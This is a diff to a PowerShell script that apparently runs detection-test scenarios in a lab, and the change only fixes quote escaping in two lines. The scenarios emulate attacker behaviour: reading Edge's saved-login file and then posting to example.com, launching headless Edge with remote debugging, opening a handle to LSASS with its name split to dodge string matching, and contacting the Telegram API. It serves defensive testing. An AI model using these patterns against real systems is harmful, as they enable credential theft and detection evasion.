@@ -100,7 +100,7 @@ $ST = [ordered]@{
     'ST-04' = { Invoke-Labsim 'st04' "[IO.File]::ReadAllBytes('$EdgeUD\Default\Login Data') | Out-Null; try { Invoke-WebRequest https://example.com -Method Post -Body x -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}; Start-Sleep 3" }
     'ST-05' = { Invoke-Labsim 'st05' "Start-Process '$Edge' '--headless=new --remote-debugging-port=9222 --user-data-dir=$Lab\cdp about:blank'; Start-Sleep 15" 60 }
     'ST-06' = { Invoke-Labsim 'st06' "Start-Process '$Edge' '--headless=new --remote-debugging-port=9223 --user-data-dir=$Lab\cdp2 about:blank'; Start-Sleep 6; try { Invoke-RestMethod http://127.0.0.1:9223/json/version | Out-Null } catch {}; Get-Process msedge -ErrorAction SilentlyContinue | ? { `$_.Path -eq '$Edge' } | Out-Null" 60 }
-    'ST-07' = { Invoke-Labsim 'st07' "Start-Process '$Edge' '--no-first-run about:blank'; Start-Sleep 6; Add-Type -Name K -Namespace W -MemberDefinition '[DllImport(\`"kernel32\`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(\`"kernel32\`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process msedge)[0].Id; [W.K]::CloseHandle([W.K]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" 60 }
+    'ST-07' = { Invoke-Labsim 'st07' "Start-Process '$Edge' '--no-first-run about:blank'; Start-Sleep 6; Add-Type -Name K -Namespace W -MemberDefinition '[DllImport(`"kernel32`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(`"kernel32`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process msedge)[0].Id; [W.K]::CloseHandle([W.K]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" 60 }
     'ST-11' = { Invoke-AsUser 'st11' "Start-Process cmd.exe '/c nslookup example.com 8.8.8.8'; Start-Sleep 5" }
     'ST-12' = { Invoke-AsUser 'st12' "& `"`$env:USERPROFILE\Downloads\kestrel-unsigned.exe`" | Out-Null" }
     'ST-14' = { Invoke-Labsim 'st14' "Resolve-DnsName api.telegram.org -ErrorAction SilentlyContinue | Out-Null; try { Invoke-WebRequest https://api.telegram.org -Method Head -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}" }
@@ -120,7 +120,7 @@ $RW = [ordered]@{
 }
 $CD = [ordered]@{
     'CD-01' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-01 }
-    'CD-03' = { Invoke-Labsim 'cd03' "Add-Type -Name L -Namespace W -MemberDefinition '[DllImport(\`"kernel32\`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(\`"kernel32\`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process ('ls'+'ass')).Id; [W.L]::CloseHandle([W.L]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" }
+    'CD-03' = { Invoke-Labsim 'cd03' "Add-Type -Name L -Namespace W -MemberDefinition '[DllImport(`"kernel32`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(`"kernel32`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process ('ls'+'ass')).Id; [W.L]::CloseHandle([W.L]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" }
     'CD-07' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-07 }
     'CD-10' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-10 }
     'CD-12' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-12 }
